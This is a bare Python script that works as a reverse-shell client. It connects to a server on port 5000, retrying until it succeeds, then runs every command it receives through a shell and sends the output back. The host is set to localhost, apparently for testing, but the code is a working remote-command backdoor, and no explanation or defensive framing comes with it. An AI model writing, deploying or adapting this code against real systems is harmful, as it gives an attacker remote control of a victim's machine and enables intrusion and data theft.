import socket
import subprocess
import time

SERVER_IP = "127.0.0.1"
PORT = 5000

def connect_server():
    while True:
        try:
            client = socket.socket()
            client.connect((SERVER_IP, PORT))
            print("Connected to server")
            return client
        except:
            print("Connection failed. Retrying in 5 seconds...")
            time.sleep(5)

client = connect_server()

while True:
    try:
        cmd = client.recv(1024).decode()

        if cmd.lower() == "exit":
            break

        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except Exception as e:
            output = str(e).encode()

        client.send(output)

    except:
        break

client.close()
